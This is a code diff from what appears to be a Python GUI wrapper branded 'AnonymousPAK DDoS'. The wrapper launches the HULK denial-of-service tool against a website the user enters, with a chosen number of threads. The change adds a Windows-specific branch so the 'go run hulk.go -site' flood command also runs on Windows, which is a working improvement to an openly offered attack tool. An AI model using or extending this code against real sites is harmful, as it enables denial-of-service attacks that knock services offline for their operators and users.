@@ -24,8 +24,11 @@ def Attack_Target():
     else:
         os.system("pyfiglet AnonymousPAK DDoS")
     messagebox.showinfo("Attack Status", "HULK-DDoS Attack has been Started with " + str(threads) + " on Website " + website)
-    DDoS_Output = "HULKMAXPROCS={0} go run hulk.go -site {1}".format(threads, website)
-    os.system(DDoS_Output)
+    if str(platform.system()) == 'Windows':
+        os.system('go run hulk.go -site {0}'.format(website))
+    else:
+        DDoS_Output = "HULKMAXPROCS={0} go run hulk.go -site {1}".format(threads, website)
+        os.system(DDoS_Output)
 
 
 
